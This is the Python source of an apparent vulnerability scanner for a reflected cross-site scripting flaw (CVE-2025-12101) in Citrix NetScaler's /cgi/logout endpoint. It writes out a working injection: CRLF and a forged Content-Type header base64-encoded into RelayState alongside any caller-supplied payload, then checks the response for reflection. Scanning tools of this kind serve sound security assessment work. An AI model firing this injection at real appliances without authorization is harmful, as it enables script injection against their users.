# src/cve_2025_12101_scanner/scanner.py
from __future__ import annotations

import base64
import re
import socket
import ssl
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import quote_plus

# Default endpoint for the CVE-2025-12101 style probe
DEFAULT_PATH = "/cgi/logout"

# Default probe header values
DEFAULT_USER_AGENT = "SternSleuth-Citrix-NetScaler-RXSS/1.1"

# Snippet window around matched payload in response
SNIPPET_WINDOW = 220

# ANSI colors (can be disabled via no_color flag)
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"

# SAMLResponse stays constant in the original PoE
SAML_RESPONSE = (
    "PD94bWwgdmVyc2lvbj0iMS4wIj8+PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2Fz"
    "aXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2Vy"
    "dGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIg"
    "VmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD50ZXN0QGV4YW1wbGUuY29tPC9zYW1sOk5h"
    "bWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+"
)


@dataclass
class Evidence:
    request_preview: str
    response_snippet: str
    matched_payload: str
    matched_at: int | None


@dataclass
class ScanResult:
    target: str
    host: str
    port: int
    scheme: str
    path: str
    status_code: int | None
    reflected: bool
    vulnerable: bool
    payload: str
    error: str | None
    timestamp_utc: str
    evidence: Evidence | None

    def to_dict(self) -> dict:
        d = asdict(self)
        return d


def _now_utc_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def build_relaystate_payload(payload: str) -> str:
    """
    Builds RelayState value using the original technique:
    RelayState = base64( CRLF + Content-Type header + CRLF + CRLF + CRLF + payload )
    Then URL-encodes it for x-www-form-urlencoded body.
    """
    relay_plain = "\r\nContent-Type: text/html\r\n\r\n\r\n" + payload
    relay_b64 = base64.b64encode(relay_plain.encode("utf-8")).decode("ascii")
    return quote_plus(relay_b64)


def build_body(payload: str) -> str:
    relaystate = build_relaystate_payload(payload)
    # SAMLResponse is already base64-like, we URL-encode it in a conservative way
    saml = quote_plus(SAML_RESPONSE)
    return f"SAMLResponse={saml}&RelayState={relaystate}"


def _build_request(
    host: str,
    path: str,
    body: str,
    extra_headers: Optional[dict[str, str]] = None,
) -> bytes:
    body_bytes = body.encode("utf-8", errors="ignore")
    headers = {
        "Host": host,
        "User-Agent": DEFAULT_USER_AGENT,
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body_bytes)),
        "Connection": "close",
    }
    if extra_headers:
        headers.update(extra_headers)

    head = f"POST {path} HTTP/1.1\r\n"
    for k, v in headers.items():
        head += f"{k}: {v}\r\n"
    head += "\r\n"
    return head.encode("utf-8") + body_bytes


def _recv_all(sock: ssl.SSLSocket, timeout: int, chunk_size: int = 4096) -> str:
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(chunk_size)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data.decode("utf-8", errors="ignore")


def _status_code_from_response(resp: str) -> int | None:
    m = re.search(r"HTTP/\d\.\d\s+(\d+)", resp)
    if not m:
        return None
    try:
        return int(m.group(1))
    except ValueError:
        return None


def _make_ssl_context(insecure: bool) -> ssl.SSLContext:
    if insecure:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    return ssl.create_default_context()


def _snippet_around(haystack: str, needle: str, window: int = SNIPPET_WINDOW) -> tuple[str, int | None]:
    idx = haystack.find(needle)
    if idx == -1:
        return ("", None)
    start = max(0, idx - window)
    end = min(len(haystack), idx + len(needle) + window)
    return (haystack[start:end], idx)


def _request_preview_for_report(request_bytes: bytes, body: str, payload: str) -> str:
    """
    Produces a report-friendly preview that includes headers and a short body excerpt
    that clearly contains the payload without dumping huge content.
    """
    try:
        head, _ = request_bytes.split(b"\r\n\r\n", 1)
        head_txt = head.decode("utf-8", errors="ignore")
    except Exception:
        head_txt = request_bytes.decode("utf-8", errors="ignore")

    # Keep a small excerpt of the body around the payload marker.
    # Body is urlencoded, so payload might not appear as-is. Include both raw payload and body excerpt.
    body_excerpt = body[:600]
    if len(body) > 600:
        body_excerpt += "...[truncated]"

    return (
        f"{head_txt}\n\n"
        f"[Body excerpt]\n{body_excerpt}\n\n"
        f"[Payload]\n{payload}\n"
    )


def scan_target(
    *,
    target_raw: str,
    host: str,
    port: int,
    scheme: str,
    path: str = DEFAULT_PATH,
    payload: str,
    timeout: int = 15,
    extra_headers: Optional[dict[str, str]] = None,
    insecure: bool = False,
    capture_evidence: bool = True,
) -> ScanResult:
    ts = _now_utc_iso()
    body = build_body(payload)
    request_bytes = _build_request(host, path, body, extra_headers)

    ctx = _make_ssl_context(insecure)

    try:
        raw_sock = socket.create_connection((host, port), timeout=timeout)
        sock = ctx.wrap_socket(raw_sock, server_hostname=None if insecure else host)
    except Exception as e:
        return ScanResult(
            target=target_raw,
            host=host,
            port=port,
            scheme=scheme,
            path=path,
            status_code=None,
            reflected=False,
            vulnerable=False,
            payload=payload,
            error=f"Connection error: {e}",
            timestamp_utc=ts,
            evidence=None,
        )

    raw_response = ""
    try:
        sock.sendall(request_bytes)
        raw_response = _recv_all(sock, timeout=timeout)
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return ScanResult(
            target=target_raw,
            host=host,
            port=port,
            scheme=scheme,
            path=path,
            status_code=None,
            reflected=False,
            vulnerable=False,
            payload=payload,
            error=f"Request error: {e}",
            timestamp_utc=ts,
            evidence=None,
        )
    finally:
        try:
            sock.close()
        except Exception:
            pass

    status_code = _status_code_from_response(raw_response)
    reflected = payload in raw_response
    vulnerable = bool(status_code in (200, 302) and reflected)

    evidence_obj: Evidence | None = None
    if capture_evidence:
        snippet, idx = _snippet_around(raw_response, payload)
        evidence_obj = Evidence(
            request_preview=_request_preview_for_report(request_bytes, body, payload),
            response_snippet=snippet,
            matched_payload=payload if reflected else "",
            matched_at=idx,
        )

    return ScanResult(
        target=target_raw,
        host=host,
        port=port,
        scheme=scheme,
        path=path,
        status_code=status_code,
        reflected=reflected,
        vulnerable=vulnerable,
        payload=payload,
        error=None,
        timestamp_utc=ts,
        evidence=evidence_obj,
    )


def print_result_human(result: ScanResult, *, no_color: bool = False) -> None:
    c_red = "" if no_color else RED
    c_green = "" if no_color else GREEN
    c_yellow = "" if no_color else YELLOW
    c_cyan = "" if no_color else CYAN
    c_bold = "" if no_color else BOLD
    c_reset = "" if no_color else RESET

    print(f"{c_cyan}{c_bold}[*] Testing: {result.host}:{result.port}{result.path}{c_reset}")

    if result.error:
        print(f"{c_red}[!] {result.error}{c_reset}")
        return

    print(f"{c_cyan}[+] HTTP status: {result.status_code}{c_reset}")
    print(f"{c_cyan}[+] Reflected: {result.reflected}{c_reset}")

    if result.vulnerable:
        print(f"{c_green}{c_bold}[VULNERABLE]{c_reset} {c_green}{result.target}{c_reset}")
        if result.evidence and result.evidence.response_snippet:
            print(f"{c_yellow}{c_bold}--- Evidence snippet ---{c_reset}")
            print(result.evidence.response_snippet)
    else:
        print(f"{c_bold}{c_red}[INFO]{c_reset} {c_red}No vulnerable behavior detected.{c_reset}")
